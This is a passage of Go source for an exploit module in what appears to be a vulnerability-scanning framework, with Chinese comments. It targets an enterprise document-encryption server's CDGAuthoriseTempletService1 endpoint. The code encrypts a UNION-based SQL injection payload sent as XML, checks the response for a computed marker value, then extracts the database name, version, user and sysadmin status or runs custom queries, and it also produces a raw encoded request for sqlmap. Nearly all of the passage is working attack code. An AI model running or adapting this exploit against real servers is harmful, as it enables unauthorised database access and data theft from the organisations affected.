			var15[15] = byte(int32(S[var8&255]) ^ var16)

			return var15, nil
		}
		var encrypt = func(in []byte, result []byte, n int, var5 [][]int) error {
			abyte := make([]byte, 16)
			if n != 0 {
				for i := 0; i < n/16; i++ {
					copy(abyte, in[i*16:i*16+16])
					abyte0, err := blockEncrypt(abyte, 0, var5)
					if err != nil {
						return err
					}
					copy(result[i*16:i*16+16], abyte0)
				}
			}
			return nil
		}
		var getTransferEncrptString = func(s string) (string, error) {
			byteTransferEncrpt := s
			nLength := len(byteTransferEncrpt)
			result := make([]byte, nLength*2)

			for i := 0; i < nLength; i++ {
				c := byteTransferEncrpt[i]
				bUpper := byte(c >> 4)
				bLowerChar := bUpper & 15
				zero := byte(0)
				if bLowerChar == zero {
					bLowerChar = bLowerChar | upper_bit_add_0101
				} else {
					bLowerChar = bLowerChar | upper_bit_add_0100
				}
				bLowerChar1 := byte(c & 15)
				if bLowerChar1 == zero {
					bLowerChar1 = bLowerChar1 | upper_bit_add_0101
				} else {
					bLowerChar1 = bLowerChar1 | upper_bit_add_0100
				}
				result[i*2] = bLowerChar
				result[i*2+1] = bLowerChar1
			}

			return string(result), nil
		}

		abyte1 := []byte(info)
		nLength := len(abyte1)
		groupsLen := 16 * (nLength / 16)
		obj1, _, _ := makeKey(key2, 16)
		err := encrypt(abyte1, abyte1, groupsLen, obj1)
		if err != nil {
			return "", err
		}
		if groupsLen != nLength {
			nLeft := nLength - groupsLen
			for i := 0; i < nLeft; i++ {
				n := groupsLen + i
				abyte1[n] = byte(int(abyte1[n]) ^ i)
			}
		}
		src, err := getTransferEncrptString(string(abyte1))
		if err != nil {
			return "", err
		}
		return src, nil
	}

	setSqlPayloadHashdsnuunwdjnwjkbuedsmkm := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/CDGServer3/CDGAuthoriseTempletService1"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/xml")
		requestConfig.FollowRedirect = false
		requestConfig.Data, err = encode_cmdnucwbdvcwbevyce2uyb2gcsacnuiac(sql)
		if err != nil {
			return "", "", err
		}

		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "FEPCCCLCE") {
			err = fmt.Errorf("fail")
			return "", "", err
		}

		res, err = decode_cmajdcjqech78e2b83g7fg72scamicjna(resp.RawBody)
		if err != nil {
			return "", "", err
		}
		return res, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "13558714"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `<?xml version="1.0" encoding="UTF-8" standalone="no"?><GetCDGAuthoriseTemplet><userId>SystemAdmin</userId><secretLevelId>1112233') union select '1',CONVERT(VARCHAR(10), 8549*1586),'3','4','5','6','7','8','9','10','11','12';--</secretLevelId></GetCDGAuthoriseTemplet>`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `<name>([\s\S]*?)</name>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashdsnuunwdjnwjkbuedsmkm
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1 
Host: ` + expResult.HostInfo.HostInfo + `
Content-Type: application/xml
Content-Length: 510

CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDNBBCNKNLDJINDOCEBFIKAEMNHAPLPHONFGFGIKIAODPKKLMDBNPGPHLNICFPMAIMFCOAAFINGBKHCKEAOMKBBALOEGJNGOJBLOJIGKKMKPIDMLCGOFIPFLMODDPOOJNJOGHNNMOJGPKBNDEBEIBACIDFMBIJCJDMGLFGCHAHGBIJONAGEOCIKHKHFCEPHONEMCMOJEALFDEKHHIGBCGPKAMKKFNOMJEEINOPOKLEGFLEBIIGAFCDAMAMBFDJPIKCGDFIFMGAFMGFFCECFMFDGJFGFIGICP`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `<name>([\s\S]*?)</name>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashdsnuunwdjnwjkbuedsmkm
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT CONVERT(VARCHAR(10), IS_SRVROLEMEMBER('sysadmin'))"
					}
				}
				sql = `<?xml version="1.0" encoding="UTF-8" standalone="no"?><GetCDGAuthoriseTemplet><userId>SystemAdmin</userId><secretLevelId>1112233') union select '1',(` + sql + `),'3','4','5','6','7','8','9','10','11','12';--</secretLevelId></GetCDGAuthoriseTemplet>`
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
